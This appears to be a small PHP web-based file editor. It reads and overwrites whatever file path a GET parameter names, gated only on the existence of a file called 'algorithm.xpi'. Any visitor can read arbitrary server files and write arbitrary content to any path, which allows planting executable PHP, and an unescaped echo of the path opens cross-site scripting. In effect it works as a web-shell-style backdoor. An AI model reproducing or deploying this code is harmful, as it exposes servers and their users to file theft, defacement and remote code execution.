<?php
if(!file_exists("algorithm.xpi")) {
	exit();
}
if($_GET['edit'] == 1) {
?>
<textarea name="vim" id="vim" style="width:100%;">
<?php readfile($_GET['target']); ?>
</textarea>
<input type="button" value="Save" onclick="editor(0, '<?php echo $_GET['target']; ?>', document.getElementById('vim').value)" />
<?php
} else {
	if($_GET['vim'] != "undefined") {
		$fp = fopen($_GET['target'], "w");
		fputs($fp, preg_replace("/\n/", "<br />", stripslashes($_GET['vim'])));
		fclose($fp);
	}
	?><pre>
	<?php readfile($_GET['target']); ?>
	</pre><?php
}
?>
